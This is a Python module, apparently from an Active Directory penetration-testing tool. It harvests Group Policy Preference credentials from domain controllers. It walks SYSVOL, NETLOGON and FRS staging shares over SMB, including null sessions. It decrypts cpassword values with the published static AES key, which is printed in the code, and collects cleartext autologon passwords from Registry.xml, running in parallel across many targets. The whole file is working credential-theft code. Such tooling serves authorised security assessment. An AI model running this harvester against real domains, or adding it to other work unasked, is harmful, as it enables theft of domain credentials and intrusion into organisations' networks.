"""Unified GPP credential harvester (cpassword + autologin).

Single source of truth for harvesting credentials from Group Policy
Preference XML files. Replaces:

* The cpassword-only walker that lived in
  :mod:`adscan_internal.services.unauth_enrichment_service` (which silently
  ignored ``Registry.xml`` because it filtered for the literal ``cpassword``
  substring before parsing).
* The NetExec ``-M gpp_autologin`` subprocess in
  :mod:`adscan_internal.cli.smb` (subprocess hop replaced by a native
  aiosmb spider, in line with the migration direction in CLAUDE.md).

Two attack vectors covered in one filesystem pass:

* **GPP cpassword**  — Groups.xml, Services.xml, Drives.xml,
  ScheduledTasks XML, etc. AES-256-CBC with the Microsoft-published static
  key (MSDN 2C15CBF0). Decryption is in-process; no impacket dependency.
* **GPP autologin**  — Registry.xml entries setting ``DefaultPassword`` /
  ``DefaultUserName`` / ``DefaultDomainName`` (the Get-GPPAutologon.ps1 /
  PowerShellMafia vector).

Scope policy
------------

Where it makes sense to look — explicit, closed catalog::

    DEFAULT_GPP_SHARES = (
        "SYSVOL",        # canonical, replicated to every DC
        "NETLOGON",      # same volume as SYSVOL, often readable
        "Replication",   # legacy FRS staging — readable on misconfigured
                         # 2008 R2 DCs; HTB Active is exactly this surface
        "SYSVOL_DFSR",   # variant exposed by failed FRS->DFSR migrations
        "NtFrs",         # FRS staging directory exposed as its own share
    )

Where to point the harvester:

* **All DCs of the target domain**, not only the PDC. A misconfigured
  secondary DC can leak files the PDC has cleaned up, and FRS staging
  shares typically only exist on the FRS source DC (often *not* the PDC).
  The cost is bounded — SYSVOL is small (<100MB in normal envs) and
  results are deduped on ``(username, secret)`` so duplicate hits across
  replicated DCs collapse to one.

* **Not all hosts**.  GPP files do not land on random member servers.
  Hunting "credentials in shares" across the wider estate is what
  manspider / share-spidering already covers in ADscan; this harvester
  stays narrow on purpose.

The same harvester runs in both the unauthenticated null-session flow and
the authenticated flow — the only difference is the ``SMBConnection`` it
receives.
"""

from __future__ import annotations

import asyncio
import base64
import xml.etree.ElementTree as ET
from collections.abc import Awaitable, Callable, Sequence
from dataclasses import dataclass, field
from typing import Any, Literal

from adscan_core import telemetry
from adscan_core.rich_output import print_exception

TaskStatus = Literal["done", "denied", "error", "skipped"]


# Microsoft-published GPP static AES-256 key (MSDN 2C15CBF0).
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)
_GPP_IV = b"\x00" * 16

DEFAULT_GPP_SHARES: tuple[str, ...] = (
    "SYSVOL",
    "NETLOGON",
    "Replication",
    "SYSVOL_DFSR",
    "NtFrs",
)

# Per-walk safety caps. GPP shares are normally small; these caps bound the
# blast radius if someone points the walker at a misconfigured share that
# happens to mirror a huge volume.
_DEFAULT_MAX_DEPTH = 8
_DEFAULT_MAX_FILES = 5000
_DEFAULT_MAX_FILE_BYTES = 2 * 1024 * 1024  # 2 MiB — GPP XMLs are tiny


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class GPPCpasswordLeak:
    """One GPP cpassword leak with native AES-decrypted plaintext."""

    unc_path: str
    username: str
    cpassword_ciphertext: str
    cleartext: str  # "" if decrypt failed (rare with the static key)
    xml_type: str  # Groups | Services | Drives | ScheduledTasks | ...
    source_share: str = ""
    source_target: str = ""


@dataclass
class GPPAutologinLeak:
    """One GPP-deployed Windows autologon credential (Registry.xml)."""

    unc_path: str
    username: str  # DefaultUserName
    password: str  # DefaultPassword (cleartext — never encrypted)
    domain: str  # DefaultDomainName (may be empty)
    source_share: str = ""
    source_target: str = ""


@dataclass
class GPPHarvestResult:
    """Aggregate outcome of a GPP harvest across one or many targets."""

    cpassword_leaks: list[GPPCpasswordLeak] = field(default_factory=list)
    autologin_leaks: list[GPPAutologinLeak] = field(default_factory=list)
    status: TaskStatus = "skipped"
    error: str | None = None
    targets_walked: list[str] = field(default_factory=list)
    shares_walked: list[str] = field(default_factory=list)

    @property
    def has_findings(self) -> bool:
        return bool(self.cpassword_leaks or self.autologin_leaks)

    def merge(self, other: GPPHarvestResult) -> None:
        """In-place merge with dedup on (username, secret)."""
        seen_cp = {(g.username, g.cleartext) for g in self.cpassword_leaks}
        for leak in other.cpassword_leaks:
            key = (leak.username, leak.cleartext)
            if key in seen_cp:
                continue
            seen_cp.add(key)
            self.cpassword_leaks.append(leak)

        seen_al = {(a.username, a.password) for a in self.autologin_leaks}
        for leak in other.autologin_leaks:
            key = (leak.username, leak.password)
            if key in seen_al:
                continue
            seen_al.add(key)
            self.autologin_leaks.append(leak)

        for share in other.shares_walked:
            if share not in self.shares_walked:
                self.shares_walked.append(share)
        for target in other.targets_walked:
            if target not in self.targets_walked:
                self.targets_walked.append(target)

        # Status promotion: any "done" wins over "denied"/"error", any
        # finding promotes to "done".
        priority = {"skipped": 0, "error": 1, "denied": 2, "done": 3}
        if priority.get(other.status, 0) > priority.get(self.status, 0):
            self.status = other.status
        if self.has_findings:
            self.status = "done"
        if other.error and not self.error:
            self.error = other.error


# ---------------------------------------------------------------------------
# Decryption + XML parsing
# ---------------------------------------------------------------------------


def decrypt_gpp_cpassword(cpassword: str) -> str:
    """AES-256-CBC decrypt a Microsoft GPP cpassword string.

    The cpassword as stored in Groups.xml/Services.xml is base64 with the
    trailing ``=`` padding stripped. We re-pad to a multiple of 4, base64
    decode, then AES-256-CBC decrypt with the published static key and a
    zero IV. Output is UTF-16-LE encoded by Windows; we strip PKCS7-style
    trailing bytes and decode.
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    if not cpassword:
        return ""

    padded = cpassword + "=" * ((4 - len(cpassword) % 4) % 4)
    ciphertext = base64.b64decode(padded)
    if len(ciphertext) % 16 != 0:
        ciphertext += b"\x00" * (16 - len(ciphertext) % 16)

    cipher = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(_GPP_IV))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    if plaintext:
        last = plaintext[-1]
        if 1 <= last <= 16 and plaintext.endswith(bytes([last]) * last):
            plaintext = plaintext[:-last]

    try:
        return plaintext.decode("utf-16-le").rstrip("\x00").strip()
    except UnicodeDecodeError:
        return plaintext.decode("utf-8", errors="ignore").rstrip("\x00").strip()


def _parse_autologin_registry_xml(
    xml_text: str,
) -> list[tuple[str, str, str]]:
    """Extract ``(username, password, domain)`` tuples from a Registry.xml.

    Group Policy stores ``HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon``
    autologon values as ``Properties`` elements with ``name`` =
    ``DefaultUserName`` / ``DefaultPassword`` / ``DefaultDomainName``. The
    XML is namespaced in some Windows versions; ``ET.fromstring`` tolerates
    that since we look at the local ``name`` attribute, not the tag.
    """
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return []

    user = ""
    password = ""
    domain = ""
    found_password = False
    for prop in root.iter():
        if not prop.tag.endswith("Properties"):
            continue
        attrs = prop.attrib
        name = attrs.get("name") or ""
        value = attrs.get("value") or ""
        if name == "DefaultUserName":
            user = value
        elif name == "DefaultPassword":
            password = value
            found_password = True
        elif name == "DefaultDomainName":
            domain = value

    if not found_password or not user:
        return []
    return [(user, password, domain)]


# ---------------------------------------------------------------------------
# Single-connection harvester
# ---------------------------------------------------------------------------


async def harvest_gpp_on_connection(
    connection: Any,
    *,
    shares: Sequence[str] = DEFAULT_GPP_SHARES,
    timeout: int = 60,
    max_depth: int = _DEFAULT_MAX_DEPTH,
    max_files: int = _DEFAULT_MAX_FILES,
    max_file_bytes: int = _DEFAULT_MAX_FILE_BYTES,
) -> GPPHarvestResult:
    """Walk one already-logged-in SMB connection for GPP credentials.

    The caller owns the connection lifecycle (``async with connection: ...``);
    this function only reads. Per-share failures are non-fatal — a missing or
    denied share is recorded in ``error`` and the walker moves on to the next.
    """
    from aiosmb.commons.interfaces.directory import SMBDirectory
    from aiosmb.commons.interfaces.file import SMBFile
    from aiosmb.commons.utils.cpasswd import parse_cpasswd

    target = connection.target.get_hostname_or_ip()
    result = GPPHarvestResult()
    result.targets_walked.append(target)
    last_error: str | None = None
    files_seen = 0

    async def _drive() -> None:
        nonlocal last_error, files_seen
        for share in shares:
            uncroot = f"\\\\{target}\\{share}"
            try:
                root_dir = SMBDirectory.from_uncpath(uncroot)
            except Exception as exc:  # noqa: BLE001
                last_error = f"{share}: from_uncpath {exc}"
                continue

            walked_any = False
            try:
                async for path, otype, err in root_dir.list_r(
                    connection, depth=max_depth
                ):
                    if files_seen >= max_files:
                        last_error = f"max_files ({max_files}) reached"
                        return
                    if err is not None:
                        last_error = f"{share}: {err}"
                        continue
                    walked_any = True
                    if otype != "file":
                        continue
                    fullpath_lower = path.fullpath.lower()
                    if not fullpath_lower.endswith(".xml"):
                        continue

                    files_seen += 1
                    is_registry = fullpath_lower.endswith("\\registry.xml") or (
                        fullpath_lower.endswith("/registry.xml")
                    )

                    file_obj = SMBFile.from_uncpath(path.unc_path)
                    _, ferr = await file_obj.open(connection)
                    if ferr is not None:
                        continue
                    try:
                        data, derr = await file_obj.read(max_file_bytes)
                    finally:
                        try:
                            await file_obj.close()
                        except Exception:  # noqa: BLE001
                            pass
                    if derr is not None or not data:
                        continue
                    text = data.decode("utf-8", errors="ignore")
                    text_lower = text.lower()

                    # cpassword: any GPP XML with the literal substring.
                    if "cpassword" in text_lower:
                        try:
                            entries = parse_cpasswd(path.unc_path, text)
                        except Exception as parse_exc:  # noqa: BLE001
                            telemetry.capture_exception(parse_exc)
                            print_exception(exception=parse_exc)
                            entries = []
                        for entry in entries:
                            cpw = entry.get("cpassword", "") or ""
                            if not cpw:
                                continue
                            try:
                                cleartext = decrypt_gpp_cpassword(cpw)
                            except Exception as decrypt_exc:  # noqa: BLE001
                                telemetry.capture_exception(decrypt_exc)
                                print_exception(exception=decrypt_exc)
                                cleartext = ""
                            result.cpassword_leaks.append(
                                GPPCpasswordLeak(
                                    unc_path=str(
                                        entry.get("filename") or path.unc_path
                                    ),
                                    username=str(entry.get("username") or ""),
                                    cpassword_ciphertext=cpw,
                                    cleartext=cleartext,
                                    xml_type=str(entry.get("xmltype") or ""),
                                    source_share=share,
                                    source_target=target,
                                )
                            )

                    # autologin: Registry.xml with DefaultPassword. The
                    # quick substring check before XML parsing avoids paying
                    # the parse cost on every Registry.xml in SYSVOL.
                    if is_registry and "defaultpassword" in text_lower:
                        for user, pwd, dom in _parse_autologin_registry_xml(text):
                            if not user or not pwd:
                                continue
                            result.autologin_leaks.append(
                                GPPAutologinLeak(
                                    unc_path=path.unc_path,
                                    username=user,
                                    password=pwd,
                                    domain=dom,
                                    source_share=share,
                                    source_target=target,
                                )
                            )
            except Exception as exc:  # noqa: BLE001
                last_error = f"{share}: {exc}"
                continue

            if walked_any and share not in result.shares_walked:
                result.shares_walked.append(share)

    try:
        await asyncio.wait_for(_drive(), timeout=timeout)
    except asyncio.TimeoutError:
        result.status = "done" if result.has_findings else "error"
        result.error = "GPP harvest timed out"
        return result
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        msg = str(exc)
        if "ACCESS_DENIED" in msg.upper():
            result.status = "denied"
        else:
            result.status = "error"
        result.error = msg
        return result

    if not result.shares_walked and not result.has_findings:
        result.status = "denied"
        result.error = last_error or "No GPP shares readable"
        return result

    result.status = "done"
    # Only propagate last_error when nothing was found — if at least one share
    # walked successfully, per-share failures on missing shares (NtFrs, SYSVOL_DFSR
    # not present on most DCs) are expected and not worth surfacing as an error.
    if last_error and not result.shares_walked:
        result.error = last_error
    return result


# ---------------------------------------------------------------------------
# Multi-target orchestrator
# ---------------------------------------------------------------------------


async def harvest_gpp_across_targets(
    *,
    targets: Sequence[str],
    open_connection: Callable[[str], Awaitable[Any]],
    shares: Sequence[str] = DEFAULT_GPP_SHARES,
    timeout_per_target: int = 60,
    max_concurrent: int = 4,
) -> GPPHarvestResult:
    """Harvest GPP credentials across a list of DCs in parallel.

    ``open_connection`` is an async factory that takes one target hostname/IP
    and returns an *unentered* aiosmb ``SMBConnection`` (the orchestrator
    handles ``async with`` and ``login()``). This keeps the harvester
    agnostic of the auth mode — caller decides null vs authenticated.

    Per-target failures are isolated; one denied or unreachable DC does not
    abort the rest. Final result is the merged + deduped union across all
    successful targets.
    """
    aggregate = GPPHarvestResult()
    if not targets:
        aggregate.status = "skipped"
        aggregate.error = "no targets supplied"
        return aggregate

    semaphore = asyncio.Semaphore(max(1, max_concurrent))

    async def _one(target: str) -> GPPHarvestResult:
        async with semaphore:
            try:
                connection = await open_connection(target)
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                r = GPPHarvestResult(status="error", error=f"{target}: {exc}")
                r.targets_walked.append(target)
                return r
            try:
                async with connection:
                    _, login_err = await connection.login()
                    if login_err is not None:
                        r = GPPHarvestResult(
                            status="denied", error=f"{target}: {login_err}"
                        )
                        r.targets_walked.append(target)
                        return r
                    return await harvest_gpp_on_connection(
                        connection,
                        shares=shares,
                        timeout=timeout_per_target,
                    )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                r = GPPHarvestResult(status="error", error=f"{target}: {exc}")
                r.targets_walked.append(target)
                return r

    per_target = await asyncio.gather(
        *[_one(t) for t in targets], return_exceptions=False
    )
    for r in per_target:
        aggregate.merge(r)

    if not aggregate.targets_walked:
        aggregate.targets_walked = list(targets)
    return aggregate
